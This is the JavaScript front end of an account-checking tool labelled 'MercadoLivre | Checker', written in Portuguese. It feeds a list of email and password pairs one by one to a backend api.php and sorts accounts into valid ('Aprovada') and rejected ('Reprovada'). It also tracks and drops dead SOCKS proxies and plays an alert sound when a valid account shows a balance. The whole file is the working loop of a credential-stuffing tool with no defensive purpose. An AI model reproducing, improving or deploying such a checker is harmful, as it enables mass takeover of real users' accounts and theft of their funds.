
var audio_live = new Audio('arquivos/saldo.mp3');
var audio_sock = new Audio('arquivos/sock.mp3');
var audio_finalizado = new Audio('arquivos/finalizado.mp3');
var executar = true;

$(document).ready(function () {
    $("#iniciar").click(function () {
        $('#result').fadeIn(2000);
        $(this).attr("disabled", true);
        $("#parar").attr("disabled", false);
        $("#status").html('Teste Iniciado Com Sucesso <i class="fa fa-spinner fa-spin" aria-hidden="true"></i>');
        executar = true;
        iniciar();
    });
    $("#parar").click(function () {
        $(this).attr("disabled", true);
        $("#iniciar").attr("disabled", false);
        document.getElementById('lista').disabled = false;
        document.getElementById('inputEmail').disabled = false;
        $("#status").html('<i class="fa fa-pause" aria-hidden="true"></i> Teste parado');
        executar = false;
    });

});
/* Get Configurações */
$('.get_configs').click(function () {
   $("#modal_configuracoes").modal();

});


// Trocar o botão de Testar <> importar
function r(e, v) {
    var lines = $(e).val().split('\n');
    lines.forEach(function (va, i) {
        if (va === v) {
            lines.splice(i, 1);
        }
    });
    $(e).val(lines.join("\n"));
}

    function titulo(novo) {
        document.title = novo;
    }

function CountAprovada() {
    $(".aprovada_conta").text(eval($('.aprovada_conta')[0].innerText) + 1);
}

function CountReprovada() {
    $(".reprovada_conta").text(eval($('.reprovada_conta')[0].innerText) + 1);
}

function CountSock() {
    var countsock = (eval(document.getElementById("sock_die").innerHTML) + 1);
    document.getElementById("sock_die").innerHTML = countsock;
}

function CountTestado() {
    document.getElementById("testado").innerHTML = (eval(document.getElementById("testado").innerHTML) + 1);
}

function contar_total(lista) {
    'use strict';
    var array = lista.value.split("\n");
    var total = array.length;

    if (array.length === undefined) {
        total = 0;
    }
    $("#tudo_conta").text(total);

}

function remover_linha(id) {
    var lines = $(id).val().split('\n');
    lines.splice(0, 1);
    $(id).val(lines.join("\n"));
}

var socks_die = [];

function reseta() {
    $(".aprovada_conta").text("0");
    $(".aprovada_conta_v").text("0");
    $(".reprovada_conta").text("0");
    $("#testado").text("0");
    $("#tudo_conta").text("0");
    $("#sock_die").text("0");
    $("#sock_ruim").html(null);
    status('Aguardando inicio', 'dark');
}
function unique(array) {
    return array.filter(function (el, index, arr) {
        return index == arr.indexOf(el);
    });
}
function remover_linhas_vazias() {
    var array = $("#lista").val().split('\n');
    var array_sock = $("#socks").val().split('\n');
    array = unique(array);
    array_sock = unique(array_sock);
    for (i = 0; i < array.length; i++) {
        array[i] = array[i].trim();
        array[i] = array[i].replace('   ', '');
        if (array[i].length === 0) {
            array.splice(i, 1);
        }

    }
    for (i = 0; i < array_sock.length; i++) {
        array_sock[i] = array_sock[i].trim();
        array_sock[i] = array_sock[i].replace('   ', '');
        if (array_sock[i].length === 0) {
            array_sock.splice(i, 1);
        }

    }
    $("#lista").val(array.join("\n"));
}
function status(text, type) {
    if (!type) {
        type = "primary";
    }
    $("#status").removeClass().addClass("label label-" + type).html(text);
}

function configuracoes(){

    $("#modal_configuracoes").modal();

}

function iniciar() {

    document.getElementById('lista').disabled = true;
    document.getElementById('inputEmail').disabled = true;
    reseta();
    var lista = document.getElementById("lista").value;
    if (lista.length == "0") {
        $("#modal_mailpass").modal();
        document.getElementById('iniciar').disabled = false;
        $("#parar").attr("disabled", false);
        document.getElementById('lista').disabled = false;
        $('#result').fadeOut(1000);
        status('<i class="fa fa-times" aria-hidden="true"></i> Lista Inválida!', 'warning');
        return;
    }
   
    remover_linhas_vazias();
    lista = document.getElementById("lista").value;
    contar_total(document.getElementById("lista"));
    status('<i class="fa fa-spin fa-spinner" aria-hidden="true"></i> Iniciando Testador', 'info');

    start();

}
function start() {
    if (!executar) {
        return false;
    }
   
    var array = lista.value.split("\n");
    if (array.length == "1" && array[0] == "") {
        setTimeout(function () {
            titulo('MercadoLivre | Checker');
            document.getElementById('iniciar').disabled = false;
            document.getElementById('lista').disabled = false;
            document.getElementById("lista").value = "";
            status('<i class="fa fa-check" aria-hidden="true"></i> Teste Finalizado com Sucesso! ');
            audio_finalizado.play();
            delete array;
            $("#modal_done").modal();

        }, 1001);
        return;
    }


    startchk(array[0]);
    delete array[0];
    return;


}


//Envia parametros via GET
function startchk(login) {
    var optValidaEmail = 'sim';
    var inputEmail = document.getElementById("inputEmail").value;

    $.ajax({
        url: "api.php",
        type: "GET",
        async: true,
        data: {'login': login, 'optValidaEmail':optValidaEmail, 'inputEmail':inputEmail},

        beforeSend: function(data) {
            setTimeout(function () {
                status('<i class="fa fa-spinner fa-spin fa-fw"></i> Testando.', 'info');
            }, 500);
            setTimeout(function () {
                status('<i class="fa fa-spinner fa-spin fa-fw"></i> Testando..', 'info');
            }, 750);
            setTimeout(function () {
                status('<i class="fa fa-spinner fa-spin fa-fw"></i> Testando...', 'info');
            }, 1000);
        },

        success: function (data) {

            var json = $.parseJSON(data);
            var str = json.str;
            var saldoD = json.saldoD;

            switch (json.status) {
                case 0:
                    CountTestado();
                    CountAprovada();
                    remover_linha("#lista");
                    status('<i class="fa fa-check" aria-hidden="true"></i> Aprovada! ', 'success');

                    if (json.saldoD) {
                        audio_live.play();
                    }

                    $("#aprovadas").append(str);
                    break;
                case 1:
                    CountTestado();
                    CountReprovada();
                    remover_linha("#lista");
                    status('<i class="fa fa-times" aria-hidden="true"></i> Reprovada! ', 'danger');
                    $("#reprovadas").append(str);
                    break;
                 case 2:
                    CountSock();
                    status('<i class="fa fa-times" aria-hidden="true"></i> Sock Die! ', 's bg-purple');
                    $("#sock_ruim").append(str);
                    remover_linha("#socks");
                    break;                    
                  case 3:
                    CountTestado();
                    CountAprovada();
                    remover_linha("#lista");
                    status('<i class="fa fa-check" aria-hidden="true"></i> Aprovada! ', 'success');
                    audio_live.play();
                    $("#aprovadas").append(str);
                    break;

            }
            titulo('[' + $('#testado').text() + '/' + $('#tudo_conta').text() + '] MercadoLivre');
            start();
        },
        error: function () {
            start();
        }


    });


}
function selectText(containerid) {
    if (document.selection) {
        var range = document.body.createTextRange();
        range.moveToElementText(document.getElementById(containerid));
        range.select();
    } else if (window.getSelection()) {
        var range = document.createRange();
        range.selectNode(document.getElementById(containerid));
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range);
    }
}

$(document).ready(function () {
    $('#btn_live').click(function () {
        $('#aprovadas').toggle(200, function () {
            if ($(this).is(':visible')) {
                $('#btn_live').html('<i class="fa fa-minus"> </i><font color="black"> Esconder </font>');
            } else {
                $('#btn_live').html('<i class="fa fa-plus"> </i><font color="black"> Mostrar </font>');
            }
        });

    });
    $('#btn_die').click(function () {
        $('#reprovadas').toggle(200, function () {
            if ($(this).is(':visible')) {
                $('#btn_die').html('<i class="fa fa-minus"> </i><font color="black"> Esconder </font>');
            } else {
                $('#btn_die').html('<i class="fa fa-plus"> </i><font color="black"> Mostrar </font>');
            }
        });
    });
    $('#btn_live_v').click(function () {
        $('#aprovadas_v').toggle(200, function () {
            if ($(this).is(':visible')) {
                $('#btn_live_v').html('<i class="fa fa-minus"> </i><font color="black"> Esconder </font>');
            } else {
                $('#btn_live_v').html('<i class="fa fa-plus"> </i><font color="black"> Mostrar </font>');
            }
        });
    });

    $('#btn-sock-hide').click(function () {
        $('#sock_ruim').toggle(200, function () {
            if ($(this).is(':visible')) {
                $('#btn-sock-hide').html('<i class="fa fa-minus"> </i><font color="black"> Esconder </font>');
            } else {
                $('#btn-sock-hide').html('<i class="fa fa-plus"> </i><font color="black"> Mostrar </font>');
            }
        });
    });

});
